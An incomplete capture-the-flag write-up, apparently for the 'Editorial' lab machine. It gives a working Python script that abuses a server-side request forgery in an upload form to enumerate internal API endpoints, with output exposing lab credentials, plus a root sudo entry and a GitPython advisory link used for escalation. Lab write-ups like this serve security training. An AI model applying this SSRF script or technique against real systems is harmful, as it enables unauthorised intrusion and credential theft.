# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: 

# Findings
### Credentials
` dev : dev080217_devAPI!@ `
` prod : 080217_Producti0n_2023!@`
## External
### Enumeration
![](https://i.imgur.com/Bnzf8wR.png)
![](https://i.imgur.com/kqUOJr1.png)
![](https://i.imgur.com/stQwVmr.png)
![](https://i.imgur.com/WOuvJGF.png)
- there is an SSRF
	- ![](https://i.imgur.com/ovYL0ur.png)
![](https://i.imgur.com/91rgm6t.png)
- `python-requests/2.25.1`
![](https://i.imgur.com/TWIsKtV.png)
- Then I tried to Fuzz the Directories the problem is,. when you send to the port 5000 the response is the success message with some path. so i have to take the path and plug it on another requst to access the page. i tried to automate the task and i made this python script.
```python
import requests

# Configuration
url = "http://editorial.htb/upload-cover"
file_with_names = "/opt/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt"
boundary = "---------------------------32699388721554656932663580981"
headers_post = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": f"multipart/form-data; boundary={boundary}",
    "Origin": "http://editorial.htb",
    "Connection": "close",
    "Referer": "http://editorial.htb/upload"
}
headers_get = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "close",
    "Upgrade-Insecure-Requests": "1"
}

# Read names from file
with open(file_with_names, 'r') as f:
    names = f.read().splitlines()

# Function to create the payload for the POST request
def create_payload(name):
    return (
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"bookurl\"\r\n\r\n"
        f"http://127.0.0.1:5000/{name}\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"bookfile\"; filename=\"\"\r\n"
        f"Content-Type: application/octet-stream\r\n\r\n\r\n"
        f"--{boundary}--\r\n"
    )

# Loop through each name
for name in names:
    # Send the POST request
    payload = create_payload(name)
    
    # Debugging: Print the payload for inspection
    print(f"Sending POST request with name '{name}' and payload:\n")

    response_post = requests.post(url, headers=headers_post, data=payload)

    # Check if the POST request was successful
    if response_post.status_code == 200:
        print(f"POST request with name '{name}' succeeded.")
        
        # Extract the URL from the response
        upload_path = response_post.text.strip()
        #print(f"Extracted upload path: {upload_path}")

        # Create the URL for the GET request
        get_url = f"http://editorial.htb/{upload_path}"

        # Send the GET request
        response_get = requests.get(get_url, headers=headers_get)

        # Check the response body for the 404 title
        if "<title>404 Not Found</title>" not in response_get.text:
            print(f"GET request to '{get_url}' succeeded.")
            print("Response Body:")
            print(response_get.text)
        else:
            print(f"GET request to '{get_url}' returned 404 Not Found.")
    else:
        print(f"POST request with name '{name}' failed with status code {response_post.status_code}. Response body:\n{response_post.text}")
```
- And i get this Success result
```json
POST request with name 'api' succeeded.
GET request to 'http://editorial.htb/static/uploads/e10486d6-310f-406e-8cfa-d7bc1c2b1e67' succeeded.
Response Body:
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}
```
![](https://i.imgur.com/2LVhXtS.png)
- I Saved the endpoints into text file and made the request with the script again
```json
POST request with name 'api/latest/metadata/messages/coupons' succeeded.
GET request to 'http://editorial.htb/static/uploads/f1c4c303-3c1c-4b8c-9955-2c0f5bbac5f0' succeeded.
Response Body:
[
  {
    "2anniversaryTWOandFOURread4": {
      "contact_email_2": "info@tiempoarriba.oc",
      "valid_until": "12/02/2024"
    }
  },
  {
    "frEsh11bookS230": {
      "contact_email_2": "info@tiempoarriba.oc",
      "valid_until": "31/11/2023"
    }
  }
]

Sending POST request with name 'api/latest/metadata/messages/authors' and payload:

POST request with name 'api/latest/metadata/messages/authors' succeeded.
GET request to 'http://editorial.htb/static/uploads/226439b2-eee1-4c37-ab0a-a16f219169e2' succeeded.
Response Body:
{
  "template_mail_message": "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."
}

Sending POST request with name 'api/latest/metadata/messages/how_to_use_platform' and payload:

POST request with name 'api/latest/metadata/messages/how_to_use_platform' succeeded.
GET request to 'http://editorial.htb/static/uploads/4a766907-88da-4dc5-b81e-b22d4716d1c0' returned 404 Not Found.
Sending POST request with name 'api/latest/metadata/changelog' and payload:

POST request with name 'api/latest/metadata/changelog' succeeded.
GET request to 'http://editorial.htb/static/uploads/8ee74984-1b92-479c-848c-d394972d2eb2' succeeded.
Response Body:
[
  {
    "1": {
      "api_route": "/api/v1/metadata/",
      "contact_email_1": "soporte@tiempoarriba.oc",
      "contact_email_2": "info@tiempoarriba.oc",
      "editorial": "Editorial El Tiempo Por Arriba"
    }
  },
  {
    "1.1": {
      "api_route": "/api/v1.1/metadata/",
      "contact_email_1": "soporte@tiempoarriba.oc",
      "contact_email_2": "info@tiempoarriba.oc",
      "editorial": "Ed Tiempo Arriba"
    }
  },
  {
    "1.2": {
      "contact_email_1": "soporte@tiempoarriba.oc",
      "contact_email_2": "info@tiempoarriba.oc",
      "editorial": "Editorial Tiempo Arriba",
      "endpoint": "/api/v1.2/metadata/"
    }
  },
  {
    "2": {
      "contact_email": "info@tiempoarriba.moc.oc",
      "editorial": "Editorial Tiempo Arriba",
      "endpoint": "/api/v2/metadata/"
    }
  }
]
```
### Gaining Access
![](https://i.imgur.com/2xVL9qQ.png)
![](https://i.imgur.com/E1vZQ9t.png)


## Internal
### Enumeration
there is a git folder, i sent to my machine and started analyzing it
![](https://i.imgur.com/xWZng6Y.png)
![](https://i.imgur.com/QWh9xTU.png)
### Gaining Access
![](https://i.imgur.com/jxwx66e.png)
`(root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *`
https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858
### Maintaining Access
![](https://i.imgur.com/xn7SlUp.png)


# Random Notes